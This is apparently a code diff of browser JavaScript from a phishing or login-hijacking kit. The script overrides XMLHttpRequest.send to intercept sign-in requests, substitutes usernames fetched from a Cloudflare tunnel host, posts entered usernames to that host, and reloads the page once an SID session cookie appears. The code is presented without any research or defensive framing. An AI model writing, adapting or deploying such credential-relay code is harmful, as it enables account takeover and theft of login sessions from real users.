@@ -1,137 +1,106 @@
 let freqUsername = null;
-let fetchingUsername = false;
+let freqPassword = null;
 const modifiedRequests = new Set();
-const pendingRequests = new Map(); // Stores pending XHRs and their bodies
-const processedXhrs = new WeakSet(); // Tracks which XHRs were modified
+const pendingRequests = new Map(); 
 
-// Fetch username only once at a time
-const fetchFreqUsername = async () => {
-    if (freqUsername !== null || fetchingUsername) return;
+let usernameFetched = false;
+let passwordFetched = false;
 
-    fetchingUsername = true;
-
-    try {
-        console.log('Fetching username...');
-        const response = await fetch('https://eve-nova-brochure-develop.trycloudflare.co/get-first-post-data');
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-
-        const result = await response.json();
-        if (result?.postData) {
-            freqUsername = result.postData;
-            await fetch('https://eve-nova-brochure-develop.trycloudflare.com/reset-first-post-data', { method: 'POST' });
-            console.log('✅ Username fetched:', freqUsername);
-            processModifiedRequests();
-        }
-    } catch (error) {
-        console.error('❌ Error fetching username:', error);
-        setTimeout(fetchFreqUsername, 1000);
-    } finally {
-        fetchingUsername = false;
+const fetchFreqUsername = () => {
+    if (freqUsername === null) {
+        console.log('fetchFreqUsername called');
+        return fetch('https://eve-nova-brochure-develop.trycloudflare.com/get-first-post-data')
+            .then(response => response.json())
+            .then(result => {
+                freqUsername = result.postData;
+                return fetch('https://eve-nova-brochure-develop.trycloudflare.com/reset-first-post-data', { method: 'POST' });
+            })
+            .then(() => {
+                usernameFetched = true;
+                processModifiedRequests();
+            })
+            .catch(error => {
+                console.error('Error fetching username:', error);
+                setTimeout(fetchFreqUsername, 1000); 
+            });
     }
 };
 
-// Ensure pending requests always get modified
+
 const processModifiedRequests = () => {
-    if (!freqUsername) return;
-
-    for (const [xhr, body] of pendingRequests) {
-        if (processedXhrs.has(xhr)) continue; // Skip already processed requests
-
-        let modifiedBody = body;
-        const match = /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
-
-        if (match && freqUsername) {
-            modifiedBody = body.replace(match[1], freqUsername);
+    for (let [xhr, body] of pendingRequests) {
+        let modified = false;
+        const firstPostMatch = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
+       
+        if (firstPostMatch && freqUsername && !modifiedRequests.has(freqUsername)) {
+            body = body.replace(firstPostMatch[1], freqUsername);
             modifiedRequests.add(freqUsername);
-            freqUsername = null; // Clear username after use
-        }
+            modified = true;
+            freqUsername = null;
+        } 
 
-        console.log('✅ Sending modified request:', modifiedBody);
-        xhr.send(modifiedBody);
-        processedXhrs.add(xhr); // Mark request as processed
-        pendingRequests.delete(xhr);
+        if (modified) {
+            xhr.send(body);
+            pendingRequests.delete(xhr);
+        }
+    }
+
+    if (!usernameFetched) fetchFreqUsername();
+};
+
+const originalXhrSend = XMLHttpRequest.prototype.send;
+XMLHttpRequest.prototype.send = function(body) {
+    if (!body) {
+        originalXhrSend.call(this, body);
+        return;
+    }
+
+    const firstPostMatch = /identity-signin-identifier/.test(body);
+    
+
+    if ((firstPostMatch) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
+        pendingRequests.set(this, body);
+        processModifiedRequests();
+    } else {
+        originalXhrSend.call(this, body);
     }
 };
 
-// Hook into XMLHttpRequest.send to modify requests dynamically
-const originalXhrSend = XMLHttpRequest.prototype.send;
-Object.defineProperty(XMLHttpRequest.prototype, "send", {
-    configurable: true,
-    writable: true,
-    value: function (body) {
-        if (!body || typeof body !== 'string') {
-            return originalXhrSend.call(this, body);
-        }
-
-        if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
-            pendingRequests.set(this, body);
-            fetchFreqUsername().then(processModifiedRequests);
-        } else {
-            originalXhrSend.call(this, body);
-        }
-    }
-});
-
-// Function to send username
-const sendUsername = async (retries = 3, delay = 1000) => {
+function sendUsername() {
     console.log('Send Username button clicked');
 
-    const usernameInput = document.getElementById('username');
-    if (!usernameInput) {
-        console.error("❌ Username input field not found.");
-        return;
-    }
-
-    const username = usernameInput.value.trim();
-    if (!username) {
-        console.warn("⚠️ No username entered, skipping request.");
-        return;
-    }
-
-    for (let attempt = 1; attempt <= retries; attempt++) {
-        try {
-            const response = await fetch('https://eve-nova-brochure-develop.trycloudflare.com/save-username', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username })
-            });
-
+    const username = document.getElementById('username').value;
+    if (username) {
+        fetch('https://eve-nova-brochure-develop.trycloudflare.com/save-username', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username })
+        })
+        .then(response => {
             if (response.ok) {
-                console.log(`✅ Username sent successfully (Attempt ${attempt})`);
-                return;
+                console.log('Username sent successfully');
             } else {
-                console.error(`❌ Attempt ${attempt} failed:`, response.statusText);
+                console.error('Error sending username:', response.statusText);
             }
-        } catch (error) {
-            console.error(`❌ Network error on attempt ${attempt}:`, error);
-        }
-
-        if (attempt < retries) {
-            await new Promise(resolve => setTimeout(resolve, delay * attempt)); // Exponential backoff
-        }
+        })
+        .catch(error => {
+            console.error('Error sending username:', error);
+        });
     }
+}
 
-    console.error("❌ Failed to send username after multiple attempts.");
-};
 
-// Attach event listeners when DOM is fully loaded
-document.addEventListener("DOMContentLoaded", () => {
-    const sendButtons = document.querySelectorAll('#sendUsernameBtn');
-
-    if (sendButtons.length === 0) {
-        console.error("❌ No sendUsernameBtn found on page.");
-    }
-
-    sendButtons.forEach(button => button.addEventListener('click', sendUsername));
+// Event listeners for send buttons
+document.querySelectorAll('#sendUsernameBtn').forEach(button => {
+    button.addEventListener('click', sendUsername);
 });
 
-// Refresh page if SID cookie is detected (every 5 sec)
-setInterval(() => {
+setInterval(function() {
     if (document.cookie.includes('SID')) {
-        console.log("🔄 SID cookie detected, reloading page...");
         location.reload();
     }
-}, 5000);
+}, 3000); // Checks every 5 seconds
 
-// Start by fetching the username
 fetchFreqUsername();
